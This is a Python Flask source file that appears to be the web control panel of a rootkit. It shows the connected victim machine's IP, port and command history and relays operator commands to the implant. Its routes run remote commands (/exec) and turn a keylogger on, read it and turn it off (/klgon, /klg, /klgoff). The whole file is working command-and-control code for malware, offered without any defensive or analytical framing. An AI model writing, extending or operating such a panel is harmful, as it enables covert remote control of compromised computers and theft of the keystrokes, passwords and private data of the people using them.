from app import app
import config as cfg
from flask import jsonify, request

def getClientInfos():
    if not cfg.rootkit_connexion:
        return {
            "authenticated": False,
            "rootkit_address": None,
            "last_command": None,
        }

    ip = cfg.rootkit_connexion.get_client_ip()
    port = cfg.rootkit_connexion.get_listening_port()
    history = cfg.rootkit_connexion.get_command_history()
    last_command = history[-1]['command'] if history else None

    return {
        "authenticated": cfg.rootkit_connexion.is_authenticated(),
        "rootkit_address": [ip, port] if ip and port else None,
        "last_command": last_command,
    }

@app.route('/client-info', methods=['GET'])
def clientInfo():
    info = getClientInfos()
    return jsonify(info), 200

@app.route('/get-history', methods=['GET'])
def get_history():
    if not cfg.rootkit_connexion:
        return jsonify({'error': 'No rootkit connection available.'}), 503

    history = cfg.rootkit_connexion.get_command_history()
    if not history:
        return jsonify({'error': 'No command history available.'}), 404

    return jsonify(history), 200

##### ROOTKIT COMMANDS HANDLER #####

def handle_command(prefix, default_use_history):
    data = {}
    if request.is_json:
        data = request.get_json(silent=True) or {}
    else:
        data = request.form.to_dict() or {}

    cmd = data.get('command', '').strip() if isinstance(data, dict) else ''
    use_history = data.get('use_history', default_use_history)

    full_cmd = f"{prefix} {cmd}".strip()

    try:
        if use_history:
            result = cfg.rootkit_connexion.send_to_client_with_history(full_cmd)
        else:
            result = cfg.rootkit_connexion.send_to_client(full_cmd)
    except Exception as e:
        result = f"💥 Erreur : {e}"

    return jsonify(result), 200


@app.route('/send', methods=['POST'])
def send():
    return handle_command("", False)

@app.route('/exec', methods=['POST'])
def exec_command():
    return handle_command("exec", True)

@app.route('/connect', methods=['POST'])
def connect_command():
    response, status_code = handle_command("connect", False)
    if cfg.rootkit_connexion.is_authenticated():
        return response, 200
    else:
        return response, 403

@app.route('/killcom', methods=['POST'])
def killcom_command():
    return handle_command("killcom", False)

@app.route('/klgon', methods=['POST'])
def klgon_command():
    return handle_command("klgon", False)

@app.route('/klg', methods=['GET'])
def klg_command():
    return handle_command("klg", False)

@app.route('/klgoff', methods=['POST'])
def klgoff_command():
    return handle_command("klgoff", False)
